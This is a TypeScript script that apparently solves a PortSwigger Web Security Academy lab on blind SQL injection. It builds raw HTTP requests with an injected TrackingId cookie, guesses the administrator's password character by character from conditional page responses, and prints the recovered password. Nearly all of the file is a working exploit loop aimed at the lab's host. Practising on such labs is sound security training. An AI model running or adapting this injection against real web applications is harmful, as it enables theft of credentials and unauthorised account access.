/**
 * PortSwigger Lab: Blind SQL injection with conditional responses
 * https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
 */

import { Sess } from "../base"

const LABID = "0a43003a04cf79b48039177c0016009e"

const iter = async (index: number, char: string) => {
	return await Sess.req`
		GET / HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: TrackingId=yAR5zTY0EfdlyjxY'%20and%20substring((select%20password%20from%20users%20where%20username%20%3d%20'administrator')%2c%20${index}%2c%201)%20%3d%20'${char}; session=QzVRiWMkInUFSYvG1cxxr5ZLd1EegYE7
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Mobile: ?0
		Sec-Ch-Ua-Platform: "macOS"
		Upgrade-Insecure-Requests: 1
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.6
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: navigate
		Sec-Fetch-User: ?1
		Sec-Fetch-Dest: document
		Referer: https://${LABID}.web-security-academy.net/filter?category=Accessories
		Accept-Encoding: gzip, deflate, br
	`.then(r => r.body().includes("Welcome back!"))
}

let index = 1
let password = ""
const chars = "abcdefghijklmnopqrstuvwxyz0123456789".split("")

for (let i = 0; i < 50; i++) {
	let found = false
	for (const char of chars) {
		if (await iter(index, char)) {
			console.log(`SUCCESS CHAR ${index}: ${char}`)
			password += char
			found = true
			break
		}
	}

	if (found) {
		index++
	} else {
		console.log(`FAILURE CHAR ${index}`)
		break
	}
}

console.log(`PASSWORD: ${password}`)
